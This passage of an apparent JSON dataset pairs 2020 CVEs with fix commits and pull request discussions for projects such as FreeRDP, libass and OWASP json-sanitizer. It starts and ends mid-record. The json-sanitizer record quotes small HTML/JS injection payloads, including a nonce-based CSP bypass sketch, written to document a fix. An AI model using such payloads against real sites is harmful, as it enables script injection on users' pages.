(+0.21%)` | :arrow_up: |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/862?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/862?src=pr&el=footer). Last update [109d5df...15be169](https://codecov.io/gh/Exiv2/exiv2/pull/862?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).",
            "pr_title_words": 6,
            "comments_words": 174,
            "total_other_info_words": 180
        },
        {
            "cve-id": "CVE-2020-22217",
            "commit_url": "https://github.com/c-ares/c-ares/commit/1b98172b141fe874ad43e679e67506f9b2139043",
            "commit_msg": "avoid read-heap-buffer-overflow (#332)\n\nFix invalid read in ares_parse_soa_reply.c found during fuzzing\r\n\r\nFixes Bug: #333 \r\nFix By: lutianxiong (@ltx2018)",
            "commit_msg_words": 18,
            "other_info": "avoid read-heap-buffer-overflow \n[![Coverage Status](https://coveralls.io/builds/30944612/badge)](https://coveralls.io/builds/30944612)\n\nCoverage increased (+0.005%) to 89.145% when pulling **0ccf84690fdb1332828157dbc9859fe6d45e5444 on ltx2018:master** into **4c02944ef1cedb9460825d28b4e5c27988d04dba on c-ares:master**.",
            "pr_title_words": 2,
            "comments_words": 16,
            "total_other_info_words": 18
        },
        {
            "cve-id": "CVE-2020-26682",
            "commit_url": "https://github.com/libass/libass/commit/676f9dc5b52ef406c5527bdadbcb947f11392929",
            "commit_msg": "outline: fix overflows in outline processing\n\nThis commit enforces strict invariant on ASS_Outline\nto contain point coordinates into predetermined range.\n\nFixes https://github.com/libass/libass/issues/431.",
            "commit_msg_words": 22,
            "other_info": "Fix overflows in outline processing Can confirm that this fixes #431. \r\n\r\nOverflow checks seem fine to me. *(Assuming `abs(OUTLINE_MAX) < abs(OUTLINE_MIN)` will stay true in future version, which it probably will, I guess)* > Assuming `abs(OUTLINE_MAX) < abs(OUTLINE_MIN)` will stay true in future version, which it probably will, I guess\r\n\r\nMaybe it's even better to get rid of `OUTLINE_MIN` altogether and use `-OUTLINE_MAX` instead. New, more strict version. `max(abs(x), abs(y)) <= OUTLINE_MAX` is now enforced invariant of `ASS_Outline` instead of some ad hoc check. Also I've got rid of `OUTLINE_MIN`. @MrSmile \r\n\r\n```\r\nass_outline.c:53:12: warning: absolute value function 'abs' given an argument of type 'const FT_Pos' (aka 'const long') but has parameter of type 'int' which may cause truncation of value [-Wabsolute-value]\r\n    return abs(pt->x) <= OUTLINE_MAX && abs(pt->y) <= OUTLINE_MAX;\r\n           ^\r\nass_outline.c:53:12: note: use function 'labs' instead\r\n    return abs(pt->x) <= OUTLINE_MAX && abs(pt->y) <= OUTLINE_MAX;\r\n           ^~~\r\n           labs\r\nass_outline.c:53:41: warning: absolute value function 'abs' given an argument of type 'const FT_Pos' (aka 'const long') but has parameter of type 'int' which may cause truncation of value [-Wabsolute-value]\r\n    return abs(pt->x) <= OUTLINE_MAX && abs(pt->y) <= OUTLINE_MAX;\r\n                                        ^\r\nass_outline.c:53:41: note: use function 'labs' instead\r\n    return abs(pt->x) <= OUTLINE_MAX && abs(pt->y) <= OUTLINE_MAX;\r\n                                        ^~~\r\n                                        labs\r\n``` FT docs specify that `FT_Pos` is 16.16 or 26.6 fixed-point representation, so I'm not sure what's better, to cast into `int32_t` or use `labs` here. Just use `labs`. In a way, this will also serve as a sanity check to ensure the FT docs aren\u2019t lying.",
            "pr_title_words": 5,
            "comments_words": 242,
            "total_other_info_words": 247
        },
        {
            "cve-id": "CVE-2020-19007",
            "commit_url": "https://github.com/halo-dev/halo/commit/d6b3d6cb5d681c7d8d64fd48de6c7c99b696bb8b",
            "commit_msg": "fix: #547 (#677)",
            "commit_msg_words": 3,
            "other_info": "Fix #547",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2020-14033",
            "commit_url": "https://github.com/meetecho/janus-gateway/commit/fb85040405495748dbc7c4850b97da9b67b7b47b",
            "commit_msg": "Fix sscanf-related security issues",
            "commit_msg_words": 4,
            "other_info": "Fix sscanf-related security issues",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2020-10577",
            "commit_url": "https://github.com/meetecho/janus-gateway/commit/bc319056603295953f4a70999bc4553785c6e5ef",
            "commit_msg": "Fix rare race condition when claiming sessions",
            "commit_msg_words": 7,
            "other_info": "Fix rare race condition when claiming sessions > The implementation of `send_message` is up to the transport, so it might be blocking for a long time, this is not known ahead of time.\r\n\r\nFair point: we should be safe with the existing transports, though. All transports just add to a queue, right now, with the exception of MQTT which uses `MQTTAsync_sendMessage` that is asynchronous anyway. We'll probably want to add something to the documentation that says `send_message` should not be blocking, for people interested in contributing a new transport. Merging.",
            "pr_title_words": 7,
            "comments_words": 83,
            "total_other_info_words": 90
        },
        {
            "cve-id": "CVE-2020-28191",
            "commit_url": "https://github.com/togglz/togglz/commit/ed66e3f584de954297ebaf98ea4a235286784707",
            "commit_msg": "Added CSRF protection to the togglz console via a CSRF token passed between the server and the clinet. This remediates the vulnerabilty CVE-2020-28191 by blocking CSRF attacks as the attcker will not be able to guess the CSRF token value. (#495)\n\nThis has been implemented with either the session timeout of the application the togglz console is embedded in. Or if no user session is available it defaults to a 10 minute timeout for the CSRF token.\r\nThis CSRF token does not interfere with either OWASP's CSRFGuard or Spring-Security's CSRF protection if they are used within the application.\r\n\r\nCo-authored-by: Joseph Beeton <joseph.p.beeton1@aexp.com>",
            "commit_msg_words": 102,
            "other_info": "Added CSRF protection to the togglz console @JoeBeeton many thanks for your Pull Request. I still had it on my list to merge your commits, but I wanted to fix the bug in the togglz actuator endpoint and release it first. No problem. Let me know when you cut a new release containing the above fix and I'll make the CVEs public. Thank you very much for your help. @JoeBeeton I already released it. It's part of togglz 2.9.4. You can make it public if you want. \r\nThank you very much for getting in contact with me, for all the mails and also for your implementation :-)",
            "pr_title_words": 7,
            "comments_words": 100,
            "total_other_info_words": 107
        },
        {
            "cve-id": "CVE-2020-11085",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/b73143cf7ee5fe4cdabcbf56908aa15d8a883821",
            "commit_msg": "Fixed oob read in cliprdr_read_format_list",
            "commit_msg_words": 5,
            "other_info": "Stable backports \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4912/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4913/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4916/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4918/",
            "pr_title_words": 2,
            "comments_words": 56,
            "total_other_info_words": 58
        },
        {
            "cve-id": "CVE-2020-28371",
            "commit_url": "https://github.com/ReadyTalk/avian/commit/0871979b298add320ca63f65060acb7532c8a0dd",
            "commit_msg": "Fix integer overflow leading to out-of-bounds read/write",
            "commit_msg_words": 7,
            "other_info": "Fix integer overflow leading to out-of-bounds read/write",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2020-12140",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/82356e516a91200857f52ed3e9945739cba2c051",
            "commit_msg": "Fix buffer overflow in ble-l2cap",
            "commit_msg_words": 5,
            "other_info": "Fix for buffer overflow in BLE L2CAP Thanks for the fix, which checks that the destination buffer has enough space. While inspecting the code, it appears that it lacks more checks on length values extracted from input packets. This includes the <code>frame_len</code> (which should be checked against the available source data length <code>data_len</code>) and the <code>channel->rx_buffer.sdu_length</code> values. It is not necessary to fix it in this pull request, however. The merge of this pull request fixes the issue of a previously reserved CVE:\r\nCVEID: 2020-12140\r\nPRODUCT: Contiki-NG\r\nVERSION: the issue affects versions 4.7 and earlier\r\nPROBLEM TYPE: Memory Corruption allowing Remote Code Execution due to Buffer Overflow\r\nDESCRIPTION: A buffer overflow in os/net/mac/ble/ble-l2cap.c in the BLE stack in Contiki-NG 4.7 and earlier\r\nallows an attacker to execute arbitrary code via malicious L2CAP frames.",
            "pr_title_words": 7,
            "comments_words": 126,
            "total_other_info_words": 133
        },
        {
            "cve-id": "CVE-2020-10233",
            "commit_url": "https://github.com/sleuthkit/sleuthkit/commit/0c7d5e7333aeb61dace51750b56fcaad55a6359b",
            "commit_msg": "Correct guarding conditional to account for array\n\nCorrect the guard to account for the size of the array of updates, as sizeof(nfts_upd) is always 2 bytes, regardless of how many updates there actually are.\n\nFixes #1829",
            "commit_msg_words": 36,
            "other_info": "Correct guarding conditional to account for array",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2020-26880",
            "commit_url": "https://github.com/sympa-community/sympa/commit/3f8449c647e5ab32cf6f8837cb600c1756b6189c",
            "commit_msg": "Sympa SA 2020-002 (candidate): Setuid wrappers should clear environment variables to avoid exploits.",
            "commit_msg_words": 13,
            "other_info": "[SA 2020-002] Security flaws in setuid wrappers (#943) Since this PR has been reviewed by Sympa security team, it will be merged immediately.",
            "pr_title_words": 8,
            "comments_words": 15,
            "total_other_info_words": 23
        },
        {
            "cve-id": "CVE-2020-10059",
            "commit_url": "https://github.com/zephyrproject-rtos/zephyr/commit/e79336c896ff4fe51217d9ffd82b22fca8459919",
            "commit_msg": "updatehub: Require peer verification with DTLS\n\nDTLS without peer verification offers no security whatsoever (and is\narguably worse than not using DTLS in the first place).\n\nChange the verification option to require this peer verification.  To\nuse this, it may be necessary to install and use a root certificate.\n\nSigned-off-by: David Brown <david.brown@linaro.org>",
            "commit_msg_words": 53,
            "other_info": "updatehub: Require peer verification with DTLS Hi David, thank you for this update.\r\nCC @otavio",
            "pr_title_words": 6,
            "comments_words": 9,
            "total_other_info_words": 15
        },
        {
            "cve-id": "CVE-2020-15474",
            "commit_url": "https://github.com/ntop/nDPI/commit/23594f036536468072198a57c59b6e9d63caf6ce",
            "commit_msg": "Fixed stack overflow caused by missing length check\n\nSigned-off-by: Toni Uhlig <matzeton@googlemail.com>",
            "commit_msg_words": 12,
            "other_info": "Fixed stack overflow caused by missing length check (also increased rdnSeqBuf to 2048 to get more RDN sequences) Thank you",
            "pr_title_words": 8,
            "comments_words": 12,
            "total_other_info_words": 20
        },
        {
            "cve-id": "CVE-2020-11096",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/b8beb55913471952f92770c90c372139d78c16c0",
            "commit_msg": "Fixed OOB read in update_read_cache_bitmap_v3_order\n\nCVE-2020-11096 thanks @antonio-morales for finding this.",
            "commit_msg_words": 11,
            "other_info": "Fixes \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5060/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5061/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5062/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5063/",
            "pr_title_words": 1,
            "comments_words": 56,
            "total_other_info_words": 57
        },
        {
            "cve-id": "CVE-2020-11538",
            "commit_url": "https://github.com/python-pillow/Pillow/commit/394d6a180a4b63a149a223b13e98a3209f837147",
            "commit_msg": "Track number of pixels, not the number of runs",
            "commit_msg_words": 9,
            "other_info": "Fix buffer overflow in SGI-RLE decoding Hi @hugovk,\r\nIs version 2.6.1 affected with this?\r\n(because it doesn't look like the case to me!) I don't know, but 2.6.1 is so old ([October 2014](https://pypi.org/project/Pillow/2.6.1)), there will be some unfixed CVEs in there so it's advisable to upgrade. \r\n\r\n* https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=Pillow Yeah, thank you! :)",
            "pr_title_words": 6,
            "comments_words": 46,
            "total_other_info_words": 52
        },
        {
            "cve-id": "CVE-2020-13398",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/8305349a943c68b1bc8c158f431dc607655aadea",
            "commit_msg": "Fixed  GHSL-2020-102 heap overflow\n\n(cherry picked from commit 197b16cc15a12813c2e4fa2d6ae9cd9c4a57e581)",
            "commit_msg_words": 9,
            "other_info": "Stable backport cve \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4974/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4976/",
            "pr_title_words": 3,
            "comments_words": 28,
            "total_other_info_words": 31
        },
        {
            "cve-id": "CVE-2020-11048",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/9301bfe730c66180263248b74353daa99f5a969b",
            "commit_msg": "Fixed #6007: Boundary checks in rdp_read_flow_control_pdu",
            "commit_msg_words": 6,
            "other_info": "Fix issues with boundary access. \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4756/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4757/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4758/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4759/\n @hardening will address your comments in a separate PR, I think better merge this now as it is already big enough. \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4766/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4767/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4768/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4769/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4770/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4771/",
            "pr_title_words": 5,
            "comments_words": 161,
            "total_other_info_words": 166
        },
        {
            "cve-id": "CVE-2020-25756",
            "commit_url": "https://github.com/cesanta/mongoose/commit/a3691602960e0a479565b439645e6b883a11a273",
            "commit_msg": "Add missing range check in mg_get_http_header()\n\nh/t BushraAloraini\n\nFixes https://github.com/cesanta/mongoose/issues/1135",
            "commit_msg_words": 10,
            "other_info": "Add missing range check in mg_get_http_header() Isn't https://github.com/cesanta/mongoose/blob/86f391c70158a0ee553746e326bc996a3a39b4c0/src/mg_http_cgi.c#L359 also affected @cpq ?  > Isn't\r\n> https://github.com/cesanta/mongoose/blob/86f391c70158a0ee553746e326bc996a3a39b4c0/src/mg_http_cgi.c#L359\r\n> also affected @cpq ?\r\n\r\n@lnksz, did you get an answer to your question? After reviewing this commit, I have the same question.  @lnksz  @mtimperley current HEAD has CGI support removed, and HTTP codebase heavily refactored.\r\nSo, not affected. Thanks @cpq that is good to know. I'm currently supporting v6.18 as the plan to move to v7.1 is still some months away. I'm thinking this check will do no harm, so I might as well put it in with the others. Do you agree? That makes sense, @mtimperley , thank you.",
            "pr_title_words": 6,
            "comments_words": 101,
            "total_other_info_words": 107
        },
        {
            "cve-id": "CVE-2020-11042",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/6b2bc41935e53b0034fe5948aeeab4f32e80f30f",
            "commit_msg": "Fix #6010: Check length in read_icon_info",
            "commit_msg_words": 6,
            "other_info": "Fix issues with boundary access. \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4756/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4757/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4758/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4759/\n @hardening will address your comments in a separate PR, I think better merge this now as it is already big enough. \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4766/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4767/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4768/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4769/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4770/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4771/",
            "pr_title_words": 5,
            "comments_words": 161,
            "total_other_info_words": 166
        },
        {
            "cve-id": "CVE-2020-35850",
            "commit_url": "https://github.com/cockpit-project/cockpit/commit/211c14b39b787bf817f6cd94e7e596e150fd32a7",
            "commit_msg": "ws: Disallow direct URL logins with LoginTo=false\n\nThe current documentation of LoginTo= isn't very specific about what\nexactly happens with a \"false\" value; but it is plausible for an admin\nto assume that \"false\" would disallow logging into a remote host\ncompletely -- not merely hide the \"Connect to:\" field and then allowing\na direct URL login anyway.\n\nIt is sometimes important to disallow direct SSH logins from the login\npage on publicly exposed bastion hosts, as this functionality allows\nunauthenticated remote users to:\n\n - scan the internal network for existing hosts, which might otherwise\n   not be accessible directly from the internet\n   (Fixes #18540, https://bugzilla.redhat.com/show_bug.cgi?id=2167006)\n\n - scan the cockpit-ws host or internal network hosts for open ports\n   (Fixes #15077, https://bugzilla.redhat.com/show_bug.cgi?id=2018741)\n\nSo change ws to reject direct URL logins with `LoginTo=false`. This\nhappens most naturally in cockpit_session_launch(), as we still want to\nallow remote URLs from the shell's host switcher in already\nauthenticated sessions. This will not produce a very friendly error\nmessage, but it doesn't have to be -- at that point specifying direct\nURLs can be considered hacking anyway.\n\nClarify the documentation accordingly.",
            "commit_msg_words": 184,
            "other_info": "ws: Disallow direct URL logins with LoginTo=false @allisonkarlitskaya Tests didn't finish yet (just my local run of this specific test, and interactively), but I'd appreciate a first review whether this is the right direction. Thanks!",
            "pr_title_words": 7,
            "comments_words": 28,
            "total_other_info_words": 35
        },
        {
            "cve-id": "CVE-2020-12668",
            "commit_url": "https://github.com/HubSpot/jinjava/commit/5dfa5b87318744a4d020b66d5f7747acc36b213b",
            "commit_msg": "add method to blacklist",
            "commit_msg_words": 4,
            "other_info": "Add to blacklist",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2020-15476",
            "commit_url": "https://github.com/ntop/nDPI/commit/b69177be2fbe01c2442239a61832c44e40136c05",
            "commit_msg": "Adds bound check in oracle protocol\n\nFound by oss-fuzz\nhttps://bugs.chromium.org/p/oss-fuzz/issues/detail?id=21780",
            "commit_msg_words": 10,
            "other_info": "Adds bound check in oracle protocol Thank you",
            "pr_title_words": 6,
            "comments_words": 2,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2020-4031",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/6d86e20e1e7caaab4f0c7f89e36d32914dbccc52",
            "commit_msg": "Fixed double free",
            "commit_msg_words": 3,
            "other_info": "Fixes \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5060/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5061/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5062/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5063/",
            "pr_title_words": 1,
            "comments_words": 56,
            "total_other_info_words": 57
        },
        {
            "cve-id": "CVE-2020-8442",
            "commit_url": "https://github.com/ossec/ossec-hids/commit/1fe77689c0d42ce58d22f95d69b6e4a77ff96bd0",
            "commit_msg": "analysisd: fix heap overflow in rootkit decoder.\n\nThe `RK_File` function of the rootcheck decoder needs to ensure it\ndoesn't index outside of `MAX_AGENTS` when trying to find/open\na rootcheck file for a given agent.\n\nPrev. to this change the value of `i` could exceed `MAX_AGENTS`\nresulting in a heap buffer overflow accessing `rk_agent_ips[i]` or\n`rk_agent_fps[i]`.\n\nThe fix is adapted from similar logic in the syscheck decoder, added as\na response to a matching vulnerability in that decoder patched in 2012.",
            "commit_msg_words": 80,
            "other_info": "analysisd: fix heap overflow in rootkit decoder.",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2020-14401",
            "commit_url": "https://github.com/LibVNC/libvncserver/commit/a6788d1da719ae006605b78d22f5a9f170b423af",
            "commit_msg": "libvncserver: scale: cast to 64 bit before shifting\n\nSince pixel_value is 64 bit the data type of the shift operand should\nbe 64 bit too to prevent integer overflows.",
            "commit_msg_words": 29,
            "other_info": "Fix various logical errors",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2020-8448",
            "commit_url": "https://github.com/ossec/ossec-hids/commit/9b8b14c88188cdc66ab25f92a26918d0cb8a7760",
            "commit_msg": "analysisd: fix possible null ptr deref in OS_CleanMSG.\n\nIf the `msg` provided to `OS_CleanMSG` has a `(` after the ID, but\ndoesn't not contain a `->` or `:` it should be rejected with\na `FORMAT_ERROR`.\n\nPrev. to this commit nesting `strstr` for `->` as the first argument to\n`strchr` for `:` results in a null ptr deref when the message is\nmalformed.",
            "commit_msg_words": 62,
            "other_info": "analysisd: fix possible null ptr deref in OS_CleanMSG.",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2020-12279",
            "commit_url": "https://github.com/libgit2/libgit2/commit/64c612cc3e25eff5fb02c59ef5a66ba7a14751e4",
            "commit_msg": "Protect against 8.3 \"short name\" attacks also on Linux/macOS\n\nThe Windows Subsystem for Linux (WSL) is getting increasingly popular,\nin particular because it makes it _so_ easy to run Linux software on\nWindows' files, via the auto-mounted Windows drives (`C:\\` is mapped to\n`/mnt/c/`, no need to set that up manually).\n\nUnfortunately, files/directories on the Windows drives can be accessed\nvia their _short names_, if that feature is enabled (which it is on the\n`C:` drive by default).\n\nWhich means that we have to safeguard even our Linux users against the\nshort name attacks.\n\nFurther, while the default options of CIFS/SMB-mounts seem to disallow\naccessing files on network shares via their short names on Linux/macOS,\nit _is_ possible to do so with the right options.\n\nSo let's just safe-guard against short name attacks _everywhere_.\n\nSigned-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>",
            "commit_msg_words": 138,
            "other_info": "Security fixes for master",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2020-12649",
            "commit_url": "https://github.com/sirdude/gurbalib/commit/220ec8cceaff2e3bda20f09164a6a96654957840",
            "commit_msg": "Update help.c\n\nadded missing parts of the pr, sorry about that",
            "commit_msg_words": 11,
            "other_info": "Patch 2 Can you take out the help bits after that I'll commit.",
            "pr_title_words": 2,
            "comments_words": 11,
            "total_other_info_words": 13
        },
        {
            "cve-id": "CVE-2020-27208",
            "commit_url": "https://github.com/solokeys/solo1/commit/a9c02cd354f34b48195a342c7f524abdef5cbcec",
            "commit_msg": "patches to improve resistance to fault injection",
            "commit_msg_words": 7,
            "other_info": "patches to improve resistance to fault injection",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2020-10070",
            "commit_url": "https://github.com/zephyrproject-rtos/zephyr/commit/0b39cbf3c01d7feec9d0dd7cc7e0e374b6113542",
            "commit_msg": "net: mqtt: Improve buffer bounds validation in mqtt_read_message_chunk\n\nVerify more strictly that data read from the transport fits into RX\nbuffer. Switch to unsigned integers, where possible, to prevent\nunnecessary signed/unsigned operations.\n\nSigned-off-by: Robert Lubos <robert.lubos@nordicsemi.no>",
            "commit_msg_words": 36,
            "other_info": "net: mqtt: Several bugfixes **All checks passed.**\n\n\n\n*Tip: The bot edits this comment instead of posting a new one, so you can check the comment's history to see earlier messages.*",
            "pr_title_words": 4,
            "comments_words": 26,
            "total_other_info_words": 30
        },
        {
            "cve-id": "CVE-2020-36407",
            "commit_url": "https://github.com/AOMediaCodec/libavif/commit/0a8e7244d494ae98e9756355dfbfb6697ded2ff9",
            "commit_msg": "Set max image size to 16384 * 16384\n\nFix https://crbug.com/oss-fuzz/24728 and\nhttps://crbug.com/oss-fuzz/24734.",
            "commit_msg_words": 12,
            "other_info": "Set max image size to 16384 * 16384",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2020-24621",
            "commit_url": "https://github.com/openmrs/openmrs-module-uiframework/commit/0422fa52c7eba3d96cce2936cb92897dca4b680a",
            "commit_msg": "UIFR-215: Do not allow loading arbitrary files",
            "commit_msg_words": 7,
            "other_info": "UIFR-215: Do not allow loading arbitrary files",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2020-13973",
            "commit_url": "https://github.com/OWASP/json-sanitizer/commit/53ceaac3e0a10e86d512ce96a0056578f2d1978f",
            "commit_msg": "Escape <!--, --> and <script\n\nIn HTML script elements, `</script` is not the only substring that\nswitches the HTML parser state even when contained in a JS string\nliteral. This commit adds escaping for `<!--`, `-->` and `<script`,\nwhich appear to be all substrings that cause state transitions which\nare not reset by the `\"` closing the string literal.",
            "commit_msg_words": 59,
            "other_info": "Escape <!--, --> and <script Thank you for this thoughtful contribution!\n\n--\nJim Manico\n\n\n> On Jun 4, 2020, at 7:40 AM, Fabian Henneke <notifications@github.com> wrote:\n> \n> \ufeff\n> In HTML script elements, </script is not the only substring that switches the HTML parser state even when contained in a JS string literal. This commit adds escaping for <!--, --> and <script, which appear to be all substrings that cause state transitions which are not reset by the \" closing the string literal.\n> \n> The injection of <!--, --> and <scriptin script elements is less severe than that of</script` since they do not directly allow the execution of arbitrary HTML/JS. However, they could potentially be used to selectively disable scripts by causing syntax errors.\n> \n> The following examples demonstrate the effect of these injections in a JSON context. In all cases, the alert is not executed, but will be executed if the value of the json variable is replaced with a harmless literal such as \"foobar\". The first example is the most relevant one since it does not have any further requirements on the contents of the script. The second and especially the third example are much more theoretical, but still valid HTML/JS.\n> \n> <script>\n>     var json = \"<!--<script>\";\n>     alert(\"not executed\");\n> </script>\n> <script>\n>     var unrelated_variable = \"<!--\";\n>     // ...\n>     var json = \"<script>\";\n>     alert(\"not executed\");\n> </script>\n> <script>\n> <!--<script>\n>     var json = \"-->\"\n> </script />\n> alert(\"not executed\");\n> </script>\n> You can view, comment on, or merge this pull request online at:\n> \n>   https://github.com/OWASP/json-sanitizer/pull/20\n> \n> Commit Summary\n> \n> Escape <!--, --> and <script\n> File Changes\n> \n> M README.md (4)\n> M src/main/java/com/google/json/JsonSanitizer.java (43)\n> M src/test/java/com/google/json/JsonSanitizerTest.java (23)\n> Patch Links:\n> \n> https://github.com/OWASP/json-sanitizer/pull/20.patch\n> https://github.com/OWASP/json-sanitizer/pull/20.diff\n> \u2014\n> You are receiving this because you are subscribed to this thread.\n> Reply to this email directly, view it on GitHub, or unsubscribe.\n Here is another example that shows why escaping `<!--` by itself is necessary:\r\n\r\n```html\r\n<script>\r\n    var json = \"<!--\";\r\n    // ...\r\n    var unrelated_variable = \"<script>\";\r\n    alert(\"not executed\");\r\n</script>\r\n``` I'll merge this tomorrow morning (US ET) and push a version to maven central.\r\n\r\nWhen I put out an advisory, does it need to touch on anything besides:\r\n\r\n- this affects embedders who are embedding sanitized JSON in HTML `<script>` elements after a `<!--` sequence\r\n  - either as part of a [*SingleLineHTMLOpenComment*](https://www.ecma-international.org/ecma-262/10.0/index.html#prod-annexB-SingleLineHTMLOpenComment)\r\n  - or embedded in JavaScript as in\r\n    ```js\r\n    [\"<!--\", x<!--y, /<!--/] // <!--\r\n    ```\r\n- users should update to version __TBD__ > I'll merge this tomorrow morning (US ET) and push a version to maven central.\r\n> \r\n> When I put out an advisory, does it need to touch on anything besides:\r\n> \r\n> - this affects embedders who are embedding sanitized JSON in HTML `<script>` elements after a `<!--` sequence\r\n>   - either as part of a [*SingleLineHTMLOpenComment*](https://www.ecma-international.org/ecma-262/10.0/index.html#prod-annexB-SingleLineHTMLOpenComment)\r\n>   - or embedded in JavaScript as in\r\n>     ```js\r\n>     [\"<!--\", x<!--y, /<!--/] // <!--\r\n>     ```\r\n> - users should update to version __TBD__\r\n\r\nI think that this potentially affects **every** embedder, not just those that already have a `<!--`in their script (see the first example above): By injecting `<!--<script>`, a script element can be forced to continue through the first end tag until a second one is encountered. \r\n\r\nIf there is no second `</script>` tag, the script will simply not execute. With a stored injection, this could be a DoS attack, with a reflected injection, this could still be used to selectively disable parts of scripts.\r\n\r\nIf there is a second `</script>` tag on the page, the result will likely be a syntax error right on the first `</script>` since it is pretty unlikely that `</script>` itself forms valid JS. But this is not completely impossible, e.g.\r\n\r\n ```\r\nalert(1)\r\n</script />\r\nalert(2)\r\n```\r\nis a valid JavaScript expression which compares `undefined` to a regular expression and the resulting truth value `false` to `undefined`, in the process showing two alerts instead of just one. While it is extremely unlikely that this can be used for XSS in practice, it might allow for creative nonce-based CSP bypasses given another injection point right after the `</script>` tag.\r\n\r\n**Edit:** The following is an example of a CSP bypass when the attacker can additionally inject in the script end tag:\r\n\r\n```html\r\n<script nonce=\"secretnonce\">\r\n    // ...\r\n    var json = \"injection_point_1_valid_JSON\"\r\n    // ...\r\n    // The following command can be anything as long as it doesn't end with a semicolon\r\n    var foo = 36\r\n</script injection_point_2>\r\n```\r\n\r\nIn this case, the attacker can inject `<!--<script>` in injection point 1 and `/;alert(1)//` 